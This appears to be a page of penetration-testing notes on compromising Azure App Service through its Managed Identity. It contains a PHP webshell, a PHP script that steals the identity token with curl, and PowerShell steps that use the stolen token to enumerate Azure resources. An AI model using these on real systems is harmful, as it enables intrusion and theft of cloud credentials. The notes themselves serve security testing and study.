# App Service

## App services

> Different sort of vulnerabilities can be found such as SQLi, file upload, commands injection etc.
>
> App services are most of the time running under \*Low privilege\*, restricting the impact of an attack.
>
> In some case, Management Identity in place on a App Service :&#x20;
>
> Ex: A user upload a file on an App Service and the App Service is moving the file on a VM.
>
> An Azure role has maybe created to handle the task.
>
> If we have able to compromise this Manage Identity account, we can abuse his privileges, e.g. connect to a Database, Execute commands on a Virtual Machine etc ..

### Manage Identity

> Once an App service is compromised, we can confirm if Management Identity is in place.

#### ENV variables

> If the following variables are listed in the ENV variables, MI is in place
>
> * **IDENTITY\_HEADER**
> * **IDENTITY\_ENDPOINT**

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

> Once the 2 variables token stolen, it is possible to request a token !

```bash
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

## Common Web APP vulnerabilties

### Classic file upload

* Webshell  phtml instead of doc ..

```php
<?php
system($_REQUEST['cmd']);
?>
```

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption><p>simple webshell</p></figcaption></figure>

* token stealer

```php
<?php

system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');

?>
```

<figure><img src="../../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### Using the stolen token



```bash
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

* check the roles (using the clientID and JWT)

```powershell
PS C:\Tools\Az> import-module az
PS C:\Tools\Az> Connect-AzAccount -AccessToken $token -AccountId <clientID>
PS C:\Tools\Az> Get-AzResource
PS C:\Tools\Az> 

```

<figure><img src="../../../../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>



OR



```powershell
$URI = 'https://management.azure.com/subscriptions/<CLIEND-ID>/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/provide
rs/Microsoft.Authorization/permissions?api-version=2015-07-01'

PS C:\> $RequestParams = @{
>> Method = 'GET'
>> Uri= $URI
>> Headers = @{
>> 'Authorization' = "Bearer $Token"
>> }
>> }
PS C:\> (Invoke-RestMethod @RequestParams).value



```

<figure><img src="../../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

